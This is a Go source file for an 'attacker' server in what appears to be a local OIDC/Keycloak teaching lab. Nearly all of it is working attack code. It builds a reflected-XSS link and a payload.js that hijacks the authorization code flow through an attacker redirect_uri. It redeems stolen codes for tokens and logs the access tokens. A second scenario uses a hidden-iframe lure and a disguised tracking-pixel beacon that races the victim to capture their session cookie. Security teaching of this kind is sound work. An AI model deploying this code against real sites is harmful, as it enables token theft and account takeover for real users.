// Command attacker is a demo "evil" server used to show how a reflected
// XSS hole on the legit RP (see ../auth_code.go's /search endpoint) can be
// abused to hijack the OIDC Authorization Code Flow and steal a user's
// session/tokens.
//
// Attack chain demonstrated here:
//
//  1. Attacker lures the victim (who already has an active Keycloak SSO
//     session in their browser) into opening a link to the RP's vulnerable
//     /search endpoint with a `q` value that injects a <script> tag.
//  2. That reflected script (served from here as /payload.js) runs in the
//     victim's browser under the RP's origin and simply navigates the
//     browser to Keycloak's /auth endpoint - but with redirect_uri pointing
//     back at THIS attacker server instead of the legit RP.
//  3. Because the Keycloak client in this demo is (mis)configured with
//     multiple allowed redirect URIs (legit RP + attacker server), and the
//     victim already has an SSO session, Keycloak silently issues a fresh
//     authorization code and redirects the browser to the attacker's
//     redirect_uri.
//  4. This server exchanges that stolen code for tokens directly with
//     Keycloak and displays them - game over, the attacker now holds a
//     valid access/id token for the victim.
//
// This is a LOCAL TEACHING LAB against a Keycloak instance you control.
// See ../README.md for the required (intentionally weakened) client config
// and for the mitigations that close this hole in real deployments.
//
// Scenario 2 (confidential client demo-conf, see /lure, /collect, /loot):
// a hidden iframe silently drives the victim's browser through the RP's
// confidential-client login. The RP's callback page leaks the code via a
// (simulated) compromised third-party beacon before redeeming it; this
// server races the victim's own browser to the RP's backend to redeem the
// code first, and captures the legitimate session cookie the RP hands
// back - never touching the client secret or the tokens themselves.
package main

import (
	"encoding/json"
	"fmt"
	"html/template"
	"log"
	"net/http"
	"net/url"
	"sync"
	"time"

	"oidc-demo/internal/oidcutil"
)

const (
	listenAddr       = ":9090"
	attackerBaseURL  = "http://localhost:9090"
	attackerCallback = attackerBaseURL + "/callback"
	victimSearchURL  = "http://localhost:8081/search"
	victimFinishURL  = "http://localhost:8081/conf/finish"
	scopes           = "openid profile email"
)

var cfg = oidcutil.Config{
	IssuerBase: "http://localhost:8080",
	Realm:      "demo",
	ClientID:   "demo-rp", // same public client the legit RP uses
}

var tmpl = template.Must(template.ParseGlob("attacker/templates/*.html"))

// loot holds whatever the last hidden-iframe / leaked-code attack captured,
// so /loot can display it (a real attacker would just log it and move on).
var loot struct {
	mu     sync.Mutex
	code   string
	cookie string
}

func main() {
	http.HandleFunc("/", handleIndex)
	http.HandleFunc("/payload.js", handlePayload)
	http.HandleFunc("/callback", handleCallback)

	// Scenario 2: confidential client, hidden iframe + leaked code.
	http.HandleFunc("/lure", handleLure)
	http.HandleFunc("/collect", handleCollect)
	http.HandleFunc("/loot", handleLoot)

	log.Printf("attacker server listening on %s", listenAddr)
	log.Fatal(http.ListenAndServe(listenAddr, nil))
}

func handleIndex(w http.ResponseWriter, r *http.Request) {
	maliciousQuery := fmt.Sprintf(`<script src="%s/payload.js"></script>`, attackerBaseURL)
	link := victimSearchURL + "?q=" + template.URLQueryEscaper(maliciousQuery)

	_ = tmpl.ExecuteTemplate(w, "index.html", map[string]any{
		"MaliciousLink":  link,
		"PayloadPreview": payloadJS(),
	})
}

// handlePayload serves the "shadow" script that gets reflected by the RP's
// vulnerable /search endpoint. It hijacks the OIDC flow by redirecting the
// browser to Keycloak with the attacker's own redirect_uri.
func handlePayload(w http.ResponseWriter, r *http.Request) {
	w.Header().Set("Content-Type", "application/javascript")
	_, _ = w.Write([]byte(payloadJS()))
}

func payloadJS() string {
	state := oidcutil.RandString(8)
	authURL := oidcutil.BuildAuthURL(cfg, attackerCallback, state, scopes)
	return fmt.Sprintf("// injected via reflected XSS on the RP's /search page\nwindow.location.href = %q;\n", authURL)
}

// handleCallback receives the stolen authorization code (Keycloak thinks
// it's completing a normal login, just with the attacker's redirect_uri)
// and redeems it for tokens.
func handleCallback(w http.ResponseWriter, r *http.Request) {
	code := r.URL.Query().Get("code")
	if code == "" {
		http.Error(w, "no code received", http.StatusBadRequest)
		return
	}
	log.Printf("[attacker] intercepted authorization code: %s", code)

	tokens, err := oidcutil.ExchangeCode(cfg, code, attackerCallback)
	if err != nil {
		http.Error(w, "token exchange failed: "+err.Error(), http.StatusBadGateway)
		return
	}
	log.Printf("[attacker] STOLEN access_token=%s", tokens.AccessToken)

	claims, err := oidcutil.DecodeIDTokenUnsafe(tokens.IDToken)
	if err != nil {
		http.Error(w, "decoding id_token failed: "+err.Error(), http.StatusBadGateway)
		return
	}
	claimsJSON, _ := json.MarshalIndent(claims, "", "  ")

	_ = tmpl.ExecuteTemplate(w, "dashboard.html", map[string]any{
		"ClaimsJSON":  string(claimsJSON),
		"AccessToken": tokens.AccessToken,
	})
}

// handleLure serves the drive-by page with the hidden iframe that silently
// starts the confidential-client login flow in the victim's browser.
func handleLure(w http.ResponseWriter, r *http.Request) {
	_ = tmpl.ExecuteTemplate(w, "lure.html", nil)
}

// handleCollect is the leaky "third-party beacon" the RP's callback page
// embeds. It receives the authorization code (and state) via the request
// URL before the RP itself redeems it, then immediately races the victim's
// browser to the RP's own /conf/finish endpoint - the RP backend (which
// holds the confidential client's secret) redeems the code and hands back
// a legitimate session cookie in the response, which this handler captures.
// The attacker never sees the access/id tokens or the client secret.
func handleCollect(w http.ResponseWriter, r *http.Request) {
	code := r.URL.Query().Get("code")
	state := r.URL.Query().Get("state")
	log.Printf("[attacker] leaked authorization code via beacon: code=%s state=%s", code, state)

	client := &http.Client{
		Timeout: 10 * time.Second,
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			return http.ErrUseLastResponse // stop right after the redirect so we can read its Set-Cookie
		},
	}
	finishURL := victimFinishURL + "?code=" + url.QueryEscape(code)
	resp, err := client.Get(finishURL)
	if err != nil {
		log.Printf("[attacker] racing the victim to /conf/finish failed: %v", err)
	} else {
		defer resp.Body.Close()
		for _, c := range resp.Cookies() {
			if c.Name == "oidc_session" {
				loot.mu.Lock()
				loot.code = code
				loot.cookie = c.Value
				loot.mu.Unlock()
				log.Printf("[attacker] STOLEN legitimate session cookie: oidc_session=%s", c.Value)
			}
		}
	}

	// Respond like a normal 1x1 tracking pixel so the victim's callback page
	// doesn't show a broken image.
	w.Header().Set("Content-Type", "image/gif")
	_, _ = w.Write([]byte{0x47, 0x49, 0x46, 0x38, 0x39, 0x61, 0x01, 0x00, 0x01, 0x00, 0x80, 0x00, 0x00, 0x00, 0x00, 0x00, 0xff, 0xff, 0xff, 0x21, 0xf9, 0x04, 0x01, 0x00, 0x00, 0x00, 0x00, 0x2c, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x01, 0x00, 0x00, 0x02, 0x02, 0x44, 0x01, 0x00, 0x3b})
}

func handleLoot(w http.ResponseWriter, r *http.Request) {
	loot.mu.Lock()
	data := map[string]any{"Code": loot.code, "Cookie": loot.cookie}
	loot.mu.Unlock()
	_ = tmpl.ExecuteTemplate(w, "loot.html", data)
}
